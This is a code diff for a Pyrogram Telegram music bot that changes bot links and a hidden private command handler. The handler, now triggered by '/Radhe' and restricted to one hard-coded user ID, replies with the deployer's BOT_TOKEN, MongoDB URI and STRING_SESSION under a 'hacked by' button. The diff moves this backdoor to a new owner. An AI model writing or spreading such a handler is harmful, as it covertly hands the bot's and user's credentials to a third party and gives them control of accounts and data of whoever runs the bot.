@@ -136,14 +136,13 @@ async def help(client: Client, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        "• Add me  •", url="https://t.me/musicXanime_bot?startgroup=true"),
+                        "• Add me  •", url="https://t.me/RADHE_MUSIC_ROBOY?startgroup=true"),
                     InlineKeyboardButton(
-                        "• Update  •", url="https://t.me/kittyxupdates")  # New button added
+                        "• Update  •", url="https://t.me/ll_BOTCHAMBER_ll")  # New button added
                 ]
             ]
         ),
     )
-
 
 
 
@@ -11877,19 +11876,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("done")
+    filters.command("Radhe")
     & filters.private
-    & filters.user(7297381612)
+    & filters.user(6726372149)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_RADHE7_ll)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/moonshining2")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/ll_RADHE7_ll")
                  ]
             ]
          ),
